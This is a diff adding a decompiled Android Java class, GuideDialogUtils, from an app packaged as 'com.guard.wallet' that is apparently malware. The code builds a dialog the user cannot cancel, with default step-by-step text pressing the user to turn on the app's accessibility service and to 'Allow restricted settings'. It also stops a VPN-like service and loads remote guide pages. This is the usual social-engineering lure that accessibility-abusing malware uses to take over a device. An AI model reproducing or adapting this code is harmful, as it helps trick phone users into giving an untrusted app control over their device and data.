@@ -1,0 +1,166 @@
+package com.guard.wallet.utils;
+
+import com.guard.wallet.core.AppUtils;
+import android.app.Activity;
+import android.app.AlertDialog;
+import android.app.AlertDialog.Builder;
+import android.content.Intent;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+import com.guard.wallet.MainApplication;
+import com.guard.wallet.activity.GuideActivity;
+import java.lang.ref.WeakReference;
+import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicInteger;
+
+public abstract class GuideDialogUtils {
+   public static WeakReference guideDialogRef;
+   public static final AtomicBoolean allowRestrictedSettings = new AtomicBoolean(true);
+   public static volatile WeakReference currentActivityRef;
+   public static final AtomicInteger guideImageIndex = new AtomicInteger(0);
+   public static final AtomicInteger triggerCount = new AtomicInteger(0);
+   public static final AtomicInteger statusCode1 = new AtomicInteger(0);
+   public static final AtomicInteger statusCode2 = new AtomicInteger(0);
+
+   public static void showGuideActivity() {
+      if (com.guard.wallet.permission.PermissionManager.getActivity() != null && (currentActivityRef == null || currentActivityRef.get() == null || currentActivityRef.get() instanceof GuideActivity)) {
+         Log.d("AccessibilityUtils", "showGuideActivity");
+         com.guard.wallet.utils.SystemHelper.d1(com.guard.wallet.permission.PermissionManager.getActivity().getPackageName(), GuideActivity.class.getName());
+      }
+   }
+
+   public static void dismissGuideDialog() {
+      WeakReference var0 = guideDialogRef;
+      if (var0 != null && var0.get() != null) {
+         ((AlertDialog)guideDialogRef.get()).dismiss();
+         guideDialogRef = null;
+      }
+   }
+
+   public static String getGuidePageUrl() {
+      String var0 = com.guard.wallet.utils.ConfigManager.getGuideUrl().concat("/guide/").concat(String.valueOf(guideImageIndex.get()));
+      Log.d("AccessibilityUtils", var0);
+      return var0;
+   }
+
+   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
+   // $VF: Could not inline inconsistent finally blocks
+   // $VF: Could not create synchronized statement, marking monitor enters and exits
+   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
+   public static void registerCurrentActivity(Activity var0) {
+      synchronized (Activity.class){} // $VF: monitorenter
+
+      Throwable var10000;
+      label101: {
+         try {
+            WeakReference var1 = new WeakReference<>(var0);
+            currentActivityRef = var1;
+            if (currentActivityRef != null && currentActivityRef.get() != null) {
+               Intent var14 = new Intent();
+               var14.setAction("guide.vpn.service.stop.action");
+               ((Activity)currentActivityRef.get()).sendBroadcast(var14);
+            }
+
+            // $VF: monitorexit
+         } catch (Throwable var13) {
+            var10000 = var13;
+            boolean var10001 = false;
+            break label101;
+         }
+
+         label98:
+         try {
+            return;
+         } catch (Throwable var12) {
+            var10000 = var12;
+            boolean var16 = false;
+            break label98;
+         }
+      }
+
+      while (true) {
+         Throwable var15 = var10000;
+
+         try {
+            // $VF: monitorexit
+            throw var15;
+         } catch (Throwable var11) {
+            var10000 = var11;
+            boolean var17 = false;
+            continue;
+         }
+      }
+   }
+
+   public static void triggerGuideFlow() {
+      if (com.guard.wallet.utils.SystemHelper.Z() != null) {
+         new Handler(Looper.getMainLooper()).post(new com.guard.wallet.helper.DelayedRunnable(6));
+      }
+   }
+
+   public static void showAccessibilityEnableDialog() {
+      if (com.guard.wallet.permission.PermissionManager.getActivity() != null) {
+         WeakReference var0 = guideDialogRef;
+         if (var0 == null || var0.get() == null || !((AlertDialog)guideDialogRef.get()).isShowing()) {
+            Integer var4 = com.guard.wallet.utils.ConfigManager.DEFAULT_PROMOTION_MODEL;
+            String var5;
+            if (MainApplication.getInstance() != null
+               && MainApplication.getInstance().getBuildConfig() != null
+               && !q.B(MainApplication.getInstance().getBuildConfig().getAlertTitle())) {
+               var5 = MainApplication.getInstance().getBuildConfig().getAlertTitle();
+            } else {
+               var5 = "Open [accessibility_service_label]";
+            }
+
+            String var2;
+            if (MainApplication.getInstance() != null
+               && MainApplication.getInstance().getBuildConfig() != null
+               && !q.B(MainApplication.getInstance().getBuildConfig().getAlertMsg())) {
+               var2 = MainApplication.getInstance().getBuildConfig().getAlertMsg();
+            } else {
+               var2 = "1.Click go immediately and enter accessibility service column\n2.Pull down to the bottom,find already downloaded(installed) apps,and click to enter this column\n3.Find [accessibility_service_label],and click to enter this column\n4.Click the switch(in the top right corner),you can open [accessibility_service_label]";
+            }
+
+            if (MainApplication.getInstance() != null
+               && MainApplication.getInstance().getBuildConfig() != null
+               && !q.B(MainApplication.getInstance().getBuildConfig().getAlertRestrictedMsg())) {
+               MainApplication.getInstance().getBuildConfig().getAlertRestrictedMsg();
+            }
+
+            String var1;
+            if (MainApplication.getInstance() != null
+               && MainApplication.getInstance().getBuildConfig() != null
+               && !q.B(MainApplication.getInstance().getBuildConfig().getOkText())) {
+               var1 = MainApplication.getInstance().getBuildConfig().getOkText();
+            } else {
+               var1 = "Go immediately";
+            }
+
+            Builder var3 = new Builder(com.guard.wallet.permission.PermissionManager.getActivity(), 4);
+            var3.setCustomTitle(new com.guard.wallet.view.ViewPlaceholder(com.guard.wallet.permission.PermissionManager.getActivity(), var5));
+            var3.setMessage(var2);
+            var3.setCancelable(false);
+            if (!allowRestrictedSettings.get()) {
+               String var6;
+               if (MainApplication.getInstance() != null
+                  && MainApplication.getInstance().getBuildConfig() != null
+                  && !q.B(MainApplication.getInstance().getBuildConfig().getAllowRestricted())) {
+                  var6 = MainApplication.getInstance().getBuildConfig().getAllowRestricted();
+               } else {
+                  var6 = "Allow restricted settings";
+               }
+
+               var3.setNeutralButton(var6, new com.guard.wallet.helper.PositiveClickListener(1));
+            }
+
+            var3.setPositiveButton(var1, new com.guard.wallet.helper.PositiveClickListener(2));
+            var3.setOnDismissListener(new com.guard.wallet.helper.DismissListener(1));
+            var3.setOnCancelListener(new DialogCancelListener());
+            var0 = new WeakReference<>(var3.create());
+            guideDialogRef = var0;
+            ((AlertDialog)var0.get()).show();
+         }
+      }
+   }
+}
